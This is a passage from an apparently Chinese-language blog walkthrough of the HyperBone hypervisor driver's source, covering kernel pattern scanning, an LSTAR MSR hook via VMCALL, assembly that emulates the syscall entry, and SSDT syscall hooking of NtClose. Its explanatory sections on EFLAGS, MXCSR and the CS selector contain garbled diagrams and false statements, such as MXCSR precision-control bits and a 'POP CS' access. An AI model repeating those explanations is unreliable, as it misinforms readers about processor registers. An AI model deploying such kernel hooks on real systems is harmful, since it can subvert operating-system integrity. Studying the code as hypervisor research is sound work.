class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Find pattern in kernel PE section</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;section&quot;&gt;Section name&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pattern&quot;&gt;Pattern data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;wildcard&quot;&gt;Pattern wildcard symbol&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;len&quot;&gt;Pattern length&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ppFound&quot;&gt;Found address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UtilScanSection</span><span class="params">( IN PCCHAR section, IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, OUT PVOID* ppFound )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( ppFound != <span class="literal">NULL</span> );</span><br><span class="line">    <span class="keyword">if</span> (ppFound == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    PVOID base = <span class="built_in">UtilKernelBase</span>( <span class="literal">NULL</span> );<span class="comment">// 获取NTOS内核的基址</span></span><br><span class="line">    <span class="keyword">if</span> (!base)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">    PIMAGE_NT_HEADERS64 pHdr = <span class="built_in">RtlImageNtHeader</span>( base );<span class="comment">// 获取NTOS内核的PE头</span></span><br><span class="line">    <span class="keyword">if</span> (!pHdr)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_IMAGE_FORMAT;</span><br><span class="line"></span><br><span class="line">    PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + <span class="number">1</span>);<span class="comment">// 获取NTOS内核的第一个节表</span></span><br><span class="line">    <span class="comment">// 遍历所有节表，进行模式匹配</span></span><br><span class="line">    <span class="keyword">for</span> (PIMAGE_SECTION_HEADER pSection = pFirstSection; pSection &lt; pFirstSection + pHdr-&gt;FileHeader.NumberOfSections; pSection++)</span><br><span class="line">    &#123;</span><br><span class="line">        ANSI_STRING s1, s2;</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>( &amp;s1, section );</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>( &amp;s2, (PCCHAR)pSection-&gt;Name );</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">RtlCompareString</span>( &amp;s1, &amp;s2, TRUE ) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">UtilSearchPattern</span>( pattern, wildcard, len, (PUCHAR)base + pSection-&gt;VirtualAddress, pSection-&gt;Misc.VirtualSize, ppFound );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LSTAR-Hook-回调函数"><a href="#LSTAR-Hook-回调函数" class="headerlink" title="LSTAR Hook 回调函数"></a>LSTAR Hook 回调函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Per-CPU LSTAR hook/unhook routine</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Dpc&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Context&quot;&gt;New LASTAR value if hooking, 0 if unhooking&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument1&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument2&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">SHpHookCallbackDPC</span><span class="params">( PRKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Dpc );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断Context确定hook或unhook操作，进行VMCALL调用</span></span><br><span class="line">    __vmx_vmcall( Context != <span class="literal">NULL</span> ? HYPERCALL_HOOK_LSTAR : HYPERCALL_UNHOOK_LSTAR, (ULONG64)Context, <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line">    <span class="built_in">KeSignalCallDpcSynchronize</span>( SystemArgument2 );<span class="comment">// 通知等待同步</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcDone</span>( SystemArgument1 );<span class="comment">// 通知DPC执行完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SyscallEntryPoint"><a href="#SyscallEntryPoint" class="headerlink" title="SyscallEntryPoint"></a>SyscallEntryPoint</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">EXTERN HookEnabled:DB</span><br><span class="line">EXTERN ArgTble:DB</span><br><span class="line">EXTERN HookTable:DQ</span><br><span class="line"></span><br><span class="line">EXTERN KiSystemCall64Ptr:DQ</span><br><span class="line">EXTERN KiServiceCopyEndPtr:DQ</span><br><span class="line"></span><br><span class="line">USERMD_STACK_GS = 10h</span><br><span class="line">KERNEL_STACK_GS = 1A8h</span><br><span class="line"></span><br><span class="line">MAX_SYSCALL_INDEX = 1000h</span><br><span class="line"></span><br><span class="line">.CODE</span><br><span class="line"></span><br><span class="line">; *********************************************************</span><br><span class="line">;</span><br><span class="line">; Determine if the specific syscall should be hooked</span><br><span class="line">;</span><br><span class="line">; if (SyscallHookEnabled[EAX &amp; 0xFFF] == TRUE)</span><br><span class="line">;     jmp KiSystemCall64_Emulate</span><br><span class="line">; else (fall-through)</span><br><span class="line">;     jmp KiSystemCall64</span><br><span class="line">;</span><br><span class="line">; *********************************************************</span><br><span class="line">SyscallEntryPoint PROC</span><br><span class="line">    ;cli                                    ; Disable interrupts</span><br><span class="line">    swapgs                                  ; 将GS寄存器切换为内核PCR</span><br><span class="line">    mov         gs:[USERMD_STACK_GS], rsp   ; 将当前用户栈保存，以便调用返回时恢复</span><br><span class="line"></span><br><span class="line">    cmp         rax, MAX_SYSCALL_INDEX      ; 检查rax寄存器的值是否大于系统调用数组的大小</span><br><span class="line">    jge         KiSystemCall64              ; 大于，表示该调用不存在，跳转到KiSystemCall64</span><br><span class="line"></span><br><span class="line">    lea         rsp, offset HookEnabled     ; 检查Hook是否被启用</span><br><span class="line">    cmp         byte ptr [rsp + rax], 0     ; 检查Hook是否被启用</span><br><span class="line">    jne         KiSystemCall64_Emulate      ; 跳转进行KiSystemCall64_Emulate，否则进行KiSystemCall64</span><br><span class="line">SyscallEntryPoint ENDP</span><br><span class="line"></span><br><span class="line">; *********************************************************</span><br><span class="line">;</span><br><span class="line">; 返回到原始NTOSKRNL系统调用处理程序</span><br><span class="line">; (Restore all old registers first)</span><br><span class="line">;</span><br><span class="line">; *********************************************************</span><br><span class="line">KiSystemCall64 PROC</span><br><span class="line">mov         rsp, gs:[USERMD_STACK_GS]   ; 取出用户模式RSP加载到RSP，切换到用户模式栈</span><br><span class="line">swapgs                                  ; 切换到用户模式GS寄存器，恢复原先寄存器</span><br><span class="line">jmp         [KiSystemCall64Ptr]         ; 跳转到KiSystemCall64Ptr所指向的地址，64位指针</span><br><span class="line">KiSystemCall64 ENDP</span><br><span class="line"></span><br><span class="line">; *********************************************************</span><br><span class="line">;</span><br><span class="line">; 在SYSCALL之后直接执行的例程</span><br><span class="line">; (See: MSR_LSTAR)</span><br><span class="line">;</span><br><span class="line">; *********************************************************</span><br><span class="line">KiSystemCall64_Emulate PROC</span><br><span class="line">    ; NOTE:</span><br><span class="line">    ; First 2 lines are included in SyscallEntryPoint</span><br><span class="line"></span><br><span class="line">    mov         rsp, gs:[KERNEL_STACK_GS]   ; 加载内核模式RSP</span><br><span class="line">    push        2Bh                         ; push 虚拟的SS选择子</span><br><span class="line">    push        qword ptr gs:[10h]          ; push 用户模式栈指针</span><br><span class="line">    push        r11                         ; push 先前的 EFLAGS</span><br><span class="line">    push        33h                         ; push 虚拟 64位 CS 选择子</span><br><span class="line">    push        rcx                         ; push 返回地址</span><br><span class="line">    mov         rcx, r10                    ; 在rcx中保存第一个参数</span><br><span class="line"></span><br><span class="line">    sub         rsp, 8h                     ; 分配8字节作为虚拟错误码</span><br><span class="line">    push        rbp                         ; 保存标准寄存器的值</span><br><span class="line">    sub         rsp, 158h                   ; 分配一个固定大小的框架</span><br><span class="line">    lea         rbp, [rsp+80h]              ; 设置RBP为当前帧的基地址</span><br><span class="line">    mov         [rbp+0C0h], rbx             ; 保存一些非易失性的寄存器的值</span><br><span class="line">    mov         [rbp+0C8h], rdi             ;</span><br><span class="line">    mov         [rbp+0D0h], rsi             ;</span><br><span class="line">    mov         byte ptr [rbp-55h], 2h      ; 标志位，表示服务活动</span><br><span class="line">    mov         rbx, gs:[188h]              ; 获取当前线程地址</span><br><span class="line">    prefetchw   byte ptr [rbx+90h]          ; 对线程地址进行预取操作</span><br><span class="line">    stmxcsr     dword ptr [rbp-54h]         ; 保存当前MXCSR</span><br><span class="line">    ldmxcsr     dword ptr gs:[180h]         ; 设置默认MXCSR</span><br><span class="line">    cmp         byte ptr [rbx+3], 0         ; 检查调试是否启用</span><br><span class="line">    mov         word ptr [rbp+80h], 0       ; 如果调试未启用</span><br><span class="line">    jz          KiSS05                      ; 跳转到KiSS05标签处</span><br><span class="line">    mov         [rbp-50h], rax              ; 保存服务参数寄存器</span><br><span class="line">    mov         [rbp-48h], rcx              ;</span><br><span class="line">    mov         [rbp-40h], rdx              ;</span><br><span class="line">    mov         [rbp-38h], r8               ;</span><br><span class="line">    mov         [rbp-30h], r9               ;</span><br><span class="line"></span><br><span class="line">    int         3                           ; 触发一个中断</span><br><span class="line">    align       10h</span><br><span class="line"></span><br><span class="line">    KiSS05:</span><br><span class="line">    ;sti                                    ; 启动中断</span><br><span class="line">    mov         [rbx+88h], rcx</span><br><span class="line">    mov         [rbx+80h], eax</span><br><span class="line"></span><br><span class="line">KiSystemCall64_Emulate ENDP</span><br></pre></td></tr></table></figure><h4 id="EFLAGS"><a href="#EFLAGS" class="headerlink" title="EFLAGS"></a>EFLAGS</h4><p>EFLAGS是x86架构中特有的寄存器，用于存储和控制处理器的状态标志位（flags）。它记录了CPU执行指令过程中产生的各种状态信息。</p><p>EFLAGS寄存器的位布局如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31      23           15          7    0</span><br><span class="line">┌───────┬───────────┬───────────┬────┐</span><br><span class="line">|       |           |           |    |</span><br><span class="line">|  RFU  |  VM, VIP  |  ID, VIP  |  AC  |</span><br><span class="line">|       |           |           |    |</span><br><span class="line">└───────┴───────────┴───────────┴────┘</span><br></pre></td></tr></table></figure><p>各个标志位的含义如下：</p><ul><li>AC (Alignment Check)：对齐检查标志位，用于检测内存操作的对齐情况。</li><li>ID (ID Flag)：识别标志位，用于表示CPU是否支持CPUID指令。</li><li>VIP (Virtual Interrupt Pending)：虚拟中断挂起标志位，在虚拟8086模式下使用。</li><li>VIF (Virtual Interrupt Flag)：虚拟中断标志位，在虚拟8086模式下使用。</li><li>OF (Overflow Flag)：溢出标志位，用于检测有符号整数运算结果是否溢出。</li><li>DF (Direction Flag)：方向标志位，用于控制字符串操作指令的方向。</li><li>IF (Interrupt Flag)：中断标志位，用于控制CPU是否响应外部中断。</li><li>TF (Trap Flag)：陷阱标志位，用于控制CPU是否进入单步执行模式。</li><li>SF (Sign Flag)：符号标志位，用于表示有符号整数运算结果的符号。</li><li>ZF (Zero Flag)：零标志位，用于表示算术或逻辑运算结果是否为零。</li><li>AF (Auxiliary Carry Flag)：辅助进位标志位，用于检测无符号整数运算时的进位情况。</li><li>PF (Parity Flag)：奇偶标志位，用于表示运算结果的低8位中1的个数的奇偶性。</li><li>CF (Carry Flag)：进位标志位，用于检测无符号整数运算结果是否产生进位。</li></ul><p>这些标志位的状态可以通过指令读取或修改，用于判断和控制程序的执行流程。例如，通过检查ZF标志位可以判断某个运算结果是否为零，从而进行条件分支或循环的控制。</p><h4 id="MXCSR"><a href="#MXCSR" class="headerlink" title="MXCSR"></a>MXCSR</h4><p>MXCSR是x86架构中的一种控制寄存器，全称为”Floating-Point Control and Status Register”，它用于管理和控制浮点运算的行为和状态。</p><p>MXCSR寄存器是一个32位的寄存器，其位布局如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copy Code31        15       7      0</span><br><span class="line">┌─────────┬───────┬───────┬─────┐</span><br><span class="line">│   RFU   │  RC   │  PC   │  PM │</span><br><span class="line">└─────────┴───────┴───────┴─────┘</span><br></pre></td></tr></table></figure><p>各个标志位的含义如下：</p><ul><li>PM (Precision Mask)：精度掩码位，用于控制浮点运算结果的舍入精度。</li><li>PC (Precision Control)：精度控制位，用于设置浮点运算结果的默认舍入精度模式。</li><li>RC (Rounding Control)：舍入控制位，用于设置浮点运算结果的舍入方式。</li><li>RFU (Reserved for Future Use)：保留字段，暂未使用。</li></ul><p>通过对MXCSR寄存器的设置，可以控制浮点运算的舍入方式、精度和异常处理等行为。例如，可以设置精度掩码位PM来屏蔽或允许特定类型的浮点异常，或者通过设置精度控制位PC来指定浮点运算结果的默认舍入精度模式。</p><p>MXCSR寄存器可以通过指令进行读取和修改，例如LDMXCSR和STMXCSR指令。它对于进行精确的浮点计算和处理浮点异常非常重要，能够提供更好的浮点运算控制和性能优化。</p><h4 id="CS选择子"><a href="#CS选择子" class="headerlink" title="CS选择子"></a>CS选择子</h4><p>在x86架构中，CS（Code Segment）是一种代码段寄存器，主要用于存储当前程序正在执行的代码所在的段的信息。CS选择子则是对CS寄存器进行访问的一种方式。</p><p>CS选择子是一个16位的数据结构，包含了以下信息：</p><ul><li>段选择子：用于指向代码段的段描述符，其中包含了代码段的起始地址、大小、特权级等信息。</li><li>请求特权级（RPL）：用于指定代码段的访问权限，取值为0~3。</li></ul><p>CS选择子可以通过一些指令读取或修改，例如LAR指令、LDS指令、LSS指令等。在进行指令跳转时，CPU会使用CS选择子来确定下一条指令的地址。因此，CS选择子的正确设置非常重要，对程序的执行具有至关重要的影响。</p><p>需要注意的是，CS选择子只是用于访问CS寄存器的一种方式，它并不是CS寄存器本身。CS寄存器还可以通过其他方式进行访问，例如POP CS指令、IRET指令等。</p><h2 id="系统调用钩子"><a href="#系统调用钩子" class="headerlink" title="系统调用钩子"></a>系统调用钩子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Hook specific SSDT entry</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;SSDT index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;hookPtr&quot;&gt;Hook address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;argCount&quot;&gt;Number of function arguments&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHHookSyscall</span><span class="params">( IN ULONG index, IN PVOID hookPtr, IN CHAR argCount )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; MAX_SYSCALL_INDEX || hookPtr == <span class="literal">NULL</span>)<span class="comment">// 超过最大系统调用索引或者hook地址为空</span></span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    KIRQL irql = <span class="built_in">KeGetCurrentIrql</span>();<span class="comment">// 获取当前IRQL（中断请求级别）</span></span><br><span class="line">    <span class="keyword">if</span> (irql &lt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="comment">// 如果小于调度级别，提升到调度级别</span></span><br><span class="line">        irql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存原始hook地址和参数个数</span></span><br><span class="line">    <span class="comment">// 保证多线程环境下对HookTable、ArgTble、HookEnabled的操作的原子性</span></span><br><span class="line">    <span class="built_in">InterlockedExchange64</span>( (PLONG64)&amp;HookTable[index], (LONG64)hookPtr );</span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;ArgTble[index], argCount );</span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;HookEnabled[index], TRUE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复权限</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">KeGetCurrentIrql</span>() &gt; irql)</span><br><span class="line">        <span class="built_in">KeLowerIrql</span>( irql );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hkNtClose"><a href="#hkNtClose" class="headerlink" title="hkNtClose"></a>hkNtClose</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">hkNtClose</span><span class="params">( HANDLE handle )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    calls1++;<span class="comment">// 记录hkNtClose函数被调用的次数</span></span><br><span class="line">    <span class="keyword">return</span> ((pfnNtClose)g_NtClose)(handle);<span class="comment">// 使用函数指针类型pfnNtClose调用了全局变量g_NtClose所指向的原始NtClose系统调用函数，并将handle作为参数传递给原始函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hkNtClose2"><a href="#hkNtClose2" class="headerlink" title="hkNtClose2"></a>hkNtClose2</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">hkNtClose2</span><span class="params">( HANDLE handle )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PPAGE_HOOK_ENTRY pEntry = <span class="built_in">PHGetHookEntry</span>( g_NtClose );<span class="comment">// 获取全局系统调用函数的hook entry</span></span><br><span class="line">    <span class="keyword">if</span> (pEntry)</span><br><span class="line">    &#123;</span><br><span class="line">        calls2++;<span class="comment">// 记录hkNtClose2函数被调用的次数</span></span><br><span class="line">        <span class="comment">// 使用函数指针类型pfnNtClose调用了hook entry的OriginalData字段所指向的原始NtClose系统调用函数，并将handle作为参数传递给原始函数</span></span><br><span class="line">        <span class="keyword">return</span> ((pfnNtClose)pEntry-&gt;OriginalData)(handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="驱动卸载"><a href="#驱动卸载" class="headerlink" title="驱动卸载"></a>驱动卸载</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">HBUnload</span><span class="params">( IN PDRIVER_OBJECT DriverObject )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( DriverObject );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TestPrintResults</span>();<span class="comment">// 打印测试结果</span></span><br><span class="line">    <span class="built_in">TestStop</span>();<span class="comment">// 停止测试</span></span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">StopHV</span>();<span class="comment">// 停止虚拟化</span></span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Unload %s\n&quot;</span>, CPU_IDX, __FUNCTION__, <span class="built_in">NT_SUCCESS</span>( status ) ? <span class="string">&quot;SUCCEDED&quot;</span> : <span class="string">&quot;FAILED&quot;</span> );</span><br><span class="line">    <span class="built_in">FreeGlobalData</span>( g_Data );<span class="comment">// 释放全局变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打印测试结果"><a href="#打印测试结果" class="headerlink" title="打印测试结果"></a>打印测试结果</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestPrintResults</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: SyscallHook Calls made %d\n&quot;</span>, CPU_IDX, __FUNCTION__, calls1 );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: PageHook Calls made %d\n&quot;</span>, CPU_IDX, __FUNCTION__, calls2 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="停止测试"><a href="#停止测试" class="headerlink" title="停止测试"></a>停止测试</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">PHRestore</span>( g_NtClose );<span class="comment">// 恢复系统调用钩子</span></span><br><span class="line">    <span class="built_in">SHRestoreSyscall</span>( <span class="built_in">SSDTIndex</span>( &amp;ZwClose ) );<span class="comment">// 恢复原始SSDT表入口</span></span><br><span class="line">    <span class="built_in">SHDestroyHook</span>();<span class="comment">// 释放LSTAR钩子</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="恢复SSDT表"><a href="#恢复SSDT表" class="headerlink" title="恢复SSDT表"></a>恢复SSDT表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Restore original SSDT entry</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;SSDT index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHRestoreSyscall</span><span class="params">( IN ULONG index )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查最大系统调用索引</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt; MAX_SYSCALL_INDEX)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查权限</span></span><br><span class="line">    KIRQL irql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">    <span class="keyword">if</span> (irql &lt; DISPATCH_LEVEL)</span><br><span class="line">        irql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始系统调用表</span></span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;HookEnabled[index], <span class="number">0</span> );</span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;ArgTble[index], <span class="number">0</span> );</span><br><span class="line">    <span class="built_in">InterlockedExchange64</span>( (PLONG64)&amp;HookTable[index], <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原权限</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">KeGetCurrentIrql</span>() &gt; irql )</span><br><span class="line">        <span class="built_in">KeLowerIrql</span>( irql );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="释放LSTAR钩子"><a href="#释放LSTAR钩子" class="headerlink" title="释放LSTAR钩子"></a>释放LSTAR钩子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 